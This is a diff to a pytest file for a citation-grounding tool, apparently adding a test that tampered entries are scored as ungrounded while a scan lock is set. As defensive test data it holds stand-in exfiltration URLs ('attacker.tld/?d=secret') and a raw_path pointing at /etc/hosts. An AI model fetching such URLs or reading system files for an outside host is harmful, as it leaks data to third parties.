@@ -43,3 +43,22 @@ def test_locked_fetch_refuses_before_any_request(sandbox, monkeypatch):
     monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
     with pytest.raises(PermissionError):
         REAL_FETCH("https://attacker.tld/?d=secret")
+
+
+def test_tampered_entry_is_ungrounded_under_the_lock(sandbox, monkeypatch):
+    entry = {
+        "raw_path": "/etc/hosts",
+        "article_url": "https://attacker.tld/?d=x",
+        "lessons": [{"point": "p", "excerpt": "an invented quote"}],
+    }
+    unlocked = verify_citations.ground_entry(json_copy(entry))
+    assert unlocked["grounding_score"] is None  # outside a scan: unverifiable, as before
+    monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
+    locked = verify_citations.ground_entry(json_copy(entry))
+    assert locked["grounding_score"] == 0.0 and not verify_citations.fully_grounded(locked)
+
+
+def json_copy(d: dict) -> dict:
+    import json
+
+    return json.loads(json.dumps(d))
